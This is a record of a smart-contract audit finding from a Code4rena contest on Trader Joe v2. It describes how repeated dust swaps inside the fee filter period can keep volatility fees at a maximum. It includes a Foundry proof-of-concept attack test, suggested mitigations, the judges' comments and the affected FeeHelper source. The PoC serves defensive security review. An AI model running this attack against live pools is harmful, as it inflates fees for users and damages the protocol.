{
  "Title": "[M-05] Attacker can keep fees max at no cost",
  "Content": "\n[FeeHelper.sol#L58-L72](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/FeeHelper.sol#L58-L72)<br>\n\nThe volatile fee component in TJ is calculated using several variables, as described [here](https://docs.traderjoexyz.com/concepts/fees). Importantly, Va (volatility accumulator) = Vr (volatility reference) + binDelta:\n\n$v_a(k) = v_r + |i_r - (activeId + k)|$\n\nVr is calculated depending on time passed since last swap:\n```\nv_r = \\left{\\begin{matrix}\nv_r, & t\\<t_f  \\\\\nR \\cdot  v_a & t_f <= t < t_d \\\\\n0, & t_d <= t\n\\end{matrix}\\right.\n```\n\nBelow is the implementation:\n\n    function updateVariableFeeParameters(FeeParameters memory _fp, uint256 _activeId) internal view {\n            uint256 _deltaT = block.timestamp - _fp.time;\n\n            if (_deltaT >= _fp.filterPeriod || _fp.time == 0) {\n                _fp.indexRef = uint24(_activeId);\n                if (_deltaT < _fp.decayPeriod) {\n                    unchecked {\n                        // This can't overflow as `reductionFactor <= BASIS_POINT_MAX`\n                        _fp.volatilityReference = uint24(\n                            (uint256(_fp.reductionFactor) * _fp.volatilityAccumulated) / Constants.BASIS_POINT_MAX\n                        );\n                    }\n                } else {\n                    _fp.volatilityReference = 0;\n                }\n            }\n\n            _fp.time = (block.timestamp).safe40();\n\n            updateVolatilityAccumulated(_fp, _activeId);\n        }\n\nThe critical issue is that when the time since last swap is below filterPeriod, Vr does not change, yet the last swap timestamp (\\_fp.time) is updated. Therefore, attacker (TJ competitor) can keep fees extremely high at basically 0 cost, by swapping just under every Tf seconds, a zero-ish amount. Since Vr will forever stay the same, the calculated Va will stay high (at least Vr) and will make the protocol completely uncompetitive around the clock.\n\nThe total daily cost to the attacker would be  (TX fee (around `$0.05` on AVAX)  + swap fee (&tilde;0) ) &ast; filterPeriodsInDay (default value is 1728) = `$87`.\n\n### Impact\n\nAttacker can make any TraderJoe pair uncompetitive at negligible cost.\n\n### Proof of Concept\n\nAdd this test in LBPair.Fees.t.sol:\n\n    function testAbuseHighFeesAttack() public {\n            uint256 amountY = 30e18;\n            uint256 id;\n            uint256 reserveX;\n            uint256 reserveY;\n            uint256 amountXInForSwap;\n            uint256 amountYInLiquidity = 100e18;\n            FeeHelper.FeeParameters memory feeParams;\n\n            addLiquidity(amountYInLiquidity, ID_ONE, 2501, 0);\n\n            //swap X -> Y and accrue X fees\n            (amountXInForSwap,) = router.getSwapIn(pair, amountY, true);\n\n            (reserveX,reserveY,id ) = pair.getReservesAndId();\n            feeParams = pair.feeParameters();\n            console.log(\"indexRef - start\" , feeParams.indexRef);\n            console.log(\"volatilityReference - start\" , feeParams.volatilityReference);\n            console.log(\"volatilityAccumulated - start\" , feeParams.volatilityAccumulated);\n            console.log(\"active ID - start\" , id);\n            console.log(\"reserveX - start\" , reserveX);\n            console.log(\"reserveY - start\" , reserveY);\n\n            // ATTACK step 1 - Cross many bins / wait for high volatility period\n            token6D.mint(address(pair), amountXInForSwap);\n            vm.prank(ALICE);\n            pair.swap(true, DEV);\n\n            (reserveX,reserveY,id ) = pair.getReservesAndId();\n            feeParams = pair.feeParameters();\n            console.log(\"indexRef - swap1\" , feeParams.indexRef);\n            console.log(\"volatilityReference - swap1\" , feeParams.volatilityReference);\n            console.log(\"volatilityAccumulated - swap1\" , feeParams.volatilityAccumulated);\n            console.log(\"active ID - swap1\" , id);\n            console.log(\"reserveX - swap1\" , reserveX);\n            console.log(\"reserveY - swap1\" , reserveY);\n\n            // ATTACK step 2 - Decay the Va into Vr\n            vm.warp(block.timestamp + 99);\n            token18D.mint(address(pair), 10);\n            vm.prank(ALICE);\n            pair.swap(false, DEV);\n\n            (reserveX,reserveY,id ) = pair.getReservesAndId();\n            console.log(\"active ID - swap2\" , id);\n            console.log(\"reserveX - swap2\" , reserveX);\n            console.log(\"reserveY - swap2\" , reserveY);\n            feeParams = pair.feeParameters();\n            console.log(\"indexRef - swap2\" , feeParams.indexRef);\n            console.log(\"volatilityReference - swap2\" , feeParams.volatilityReference);\n            console.log(\"volatilityAccumulated - swap2\" , feeParams.volatilityAccumulated);\n\n\n            // ATTACK step 3 - keep high Vr -> high Va\n            for(uint256 i=0;i<10;i++) {\n                vm.warp(block.timestamp + 49);\n\n                token18D.mint(address(pair), 10);\n                vm.prank(ALICE);\n                pair.swap(false, DEV);\n\n                (reserveX,reserveY,id ) = pair.getReservesAndId();\n                console.log(\"**************\");\n                console.log(\"ITERATION \", i);\n                console.log(\"active ID\" , id);\n                console.log(\"reserveX\" , reserveX);\n                console.log(\"reserveY\" , reserveY);\n                feeParams = pair.feeParameters();\n                console.log(\"indexRef\" , feeParams.indexRef);\n                console.log(\"volatilityReference\" , feeParams.volatilityReference);\n                console.log(\"volatilityAccumulated\" , feeParams.volatilityAccumulated);\n                console.log(\"**************\");\n            }\n\n        }\n\n### Tools Used\n\nManual audit, foundry\n\n### Recommended Mitigation Steps\n\nSeveral options:\n\n1. Decay linearly to the time since last swap when T < Tf.\n\n2. Don't update \\_tf.time if swap did not affect Vr\n\n3. If `T<Tf`, only skip Vr update if swap amount is not negligible. This will make the attack not worth it, as protocol will accrue enough fees to offset the lack of user activity.\n\n### Severity level\n\nI argue for HIGH severity because I believe the impact to the protocol is that most users will favor alternative AMMs, which directly translates to a large loss of revenue. AMM is known to be a very competitive market and using high volatility fee `%` in low volatility times will not attract any users.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/430#issuecomment-1292424264):**\n > Not sure about severity at this time, changing to group.\n> \n> Ultimately if invariant broken, High is appropriate, if Loss of Value Med more appropriate. Devil is in the detail.\n\n**[0x0Louis (Trader Joe) acknowledged and commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/430#issuecomment-1297297728):**\n > We acknowledge this issue, but we now reset the `indexRef` in the `forceDecay` function.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/430#issuecomment-1313916735):**\n > The warden has shown how trivially a dust trade can be performed to keep fees higher than intended.\n> \n> Given the discussion above, considering that fees are more in line with loss of yield / capital inefficiency, I believe the finding to be of Medium Severity.\n\n\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2022-10-trader-joe-v2-contest",
  "Code": [
    {
      "filename": "src/libraries/FeeHelper.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"./Constants.sol\";\nimport \"./SafeCast.sol\";\nimport \"./SafeMath.sol\";\n\n/// @title Liquidity Book Fee Helper Library\n/// @author Trader Joe\n/// @notice Helper contract used for fees calculation\nlibrary FeeHelper {\n    using SafeCast for uint256;\n    using SafeMath for uint256;\n\n    /// @dev Structure to store the protocol fees:\n    /// - binStep: The bin step\n    /// - baseFactor: The base factor\n    /// - filterPeriod: The filter period, where the fees stays constant\n    /// - decayPeriod: The decay period, where the fees are halved\n    /// - reductionFactor: The reduction factor, used to calculate the reduction of the accumulator\n    /// - variableFeeControl: The variable fee control, used to control the variable fee, can be 0 to disable them\n    /// - protocolShare: The share of fees sent to protocol\n    /// - maxVolatilityAccumulated: The max value of volatility accumulated\n    /// - volatilityAccumulated: The value of volatility accumulated\n    /// - volatilityReference: The value of volatility reference\n    /// - indexRef: The index reference\n    /// - time: The last time the accumulator was called\n    struct FeeParameters {\n        uint16 binStep;\n        uint16 baseFactor;\n        uint16 filterPeriod;\n        uint16 decayPeriod;\n        uint16 reductionFactor;\n        uint24 variableFeeControl;\n        uint16 protocolShare;\n        uint24 maxVolatilityAccumulated;\n        uint24 volatilityAccumulated;\n        uint24 volatilityReference;\n        uint24 indexRef;\n        uint40 time;\n    }\n\n    /// @dev Structure used during swaps to distributes the fees:\n    /// - total: The total amount of fees\n    /// - protocol: The amount of fees reserved for protocol\n    struct FeesDistribution {\n        uint128 total;\n        uint128 protocol;\n    }\n\n    /// @notice Update the value of the volatility accumulated\n    /// @param _fp The current fee parameters\n    /// @param _activeId The current active id\n    function updateVariableFeeParameters(FeeParameters memory _fp, uint256 _activeId) internal view {\n        uint256 _deltaT = block.timestamp - _fp.time;\n\n        if (_deltaT >= _fp.filterPeriod || _fp.time == 0) {\n            _fp.indexRef = uint24(_activeId);\n            if (_deltaT < _fp.decayPeriod) {\n                unchecked {\n                    // This can't overflow as `reductionFactor <= BASIS_POINT_MAX`\n                    _fp.volatilityReference = uint24(\n                        (uint256(_fp.reductionFactor) * _fp.volatilityAccumulated) / Constants.BASIS_POINT_MAX\n                    );\n                }\n            } else {\n                _fp.volatilityReference = 0;\n            }\n        }\n\n        _fp.time = (block.timestamp).safe40();\n\n        updateVolatilityAccumulated(_fp, _activeId);\n    }\n\n    /// @notice Update the volatility accumulated\n    /// @param _fp The fee parameter\n    /// @param _activeId The current active id\n    function updateVolatilityAccumulated(FeeParameters memory _fp, uint256 _activeId) internal pure {\n        uint256 volatilityAccumulated = (_activeId.absSub(_fp.indexRef) * Constants.BASIS_POINT_MAX) +\n            _fp.volatilityReference;\n        _fp.volatilityAccumulated = volatilityAccumulated > _fp.maxVolatilityAccumulated\n            ? _fp.maxVolatilityAccumulated\n            : uint24(volatilityAccumulated);\n    }\n\n    /// @notice Returns the base fee added to a swap, with 18 decimals\n    /// @param _fp The current fee parameters\n    /// @return The fee with 18 decimals precision\n    function getBaseFee(FeeParameters memory _fp) internal pure returns (uint256) {\n        unchecked {\n            return uint256(_fp.baseFactor) * _fp.binStep * 1e10;\n        }\n    }\n\n    /// @notice Returns the variable fee added to a swap, with 18 decimals\n    /// @param _fp The current fee parameters\n    /// @return variableFee The variable fee with 18 decimals precision\n    function getVariableFee(FeeParameters memory _fp) internal pure returns (uint256 variableFee) {\n        if (_fp.variableFeeControl != 0) {\n            // Can't overflow as the max value is `max(uint24) * (max(uint24) * max(uint16)) ** 2 < max(uint104)`\n            // It returns 18 decimals as:\n            // decimals(variableFeeControl * (volatilityAccumulated * binStep)**2 / 100) = 4 + (4 + 4) * 2 - 2 = 18\n            unchecked {\n                uint256 _prod = uint256(_fp.volatilityAccumulated) * _fp.binStep;\n                variableFee = (_prod * _prod * _fp.variableFeeControl) / 100;\n            }\n        }\n    }\n\n    /// @notice Return the amount of fees added to an amount\n    /// @param _fp The current fee parameter\n    /// @param _amount The amount of token sent\n    /// @return The fee amount\n    function getFeeAmount(FeeParameters memory _fp, uint256 _amount) internal pure returns (uint256) {\n        return (_amount * getTotalFee(_fp)) / (Constants.PRECISION);\n    }\n\n    /// @notice Return the fees from an amount\n    /// @param _fp The current fee parameter\n    /// @param _amountPlusFee The amount of token sent\n    /// @return The fee amount\n    function getFeeAmountFrom(FeeParameters memory _fp, uint256 _amountPlusFee) internal pure returns (uint256) {\n        uint256 _fee = getTotalFee(_fp);\n        return (_amountPlusFee * _fee) / (Constants.PRECISION + _fee);\n    }\n\n    /// @notice Return the fees added when an user adds liquidity and change the ratio in the active bin\n    /// @param _fp The current fee parameter\n    /// @param _amountPlusFee The amount of token sent\n    /// @return The fee amount\n    function getFeeAmountForC(FeeParameters memory _fp, uint256 _amountPlusFee) internal pure returns (uint256) {\n        uint256 _fee = getTotalFee(_fp);\n        return (_amountPlusFee * _fee * (_fee + Constants.PRECISION)) / (Constants.PRECISION * Constants.PRECISION);\n    }\n\n    /// @notice Return the fees distribution added to an amount\n    /// @param _fp The current fee parameter\n    /// @param _fees The fee amount\n    /// @return fees The fee distribution\n    function getFeeAmountDistribution(FeeParameters memory _fp, uint256 _fees)\n        internal\n        pure\n        returns (FeesDistribution memory fees)\n    {\n        fees.total = _fees.safe128();\n        // unsafe math is fine because total >= protocol\n        unchecked {\n            fees.protocol = uint128((_fees * _fp.protocolShare) / Constants.BASIS_POINT_MAX);\n        }\n    }\n\n    /// @notice Return the total fee, i.e. baseFee + variableFee\n    /// @param _fp The current fee parameter\n    /// @return The total fee, with 18 decimals\n    function getTotalFee(FeeParameters memory _fp) private pure returns (uint256) {\n        unchecked {\n            return getBaseFee(_fp) + getVariableFee(_fp);\n        }\n    }\n}"
    }
  ]
}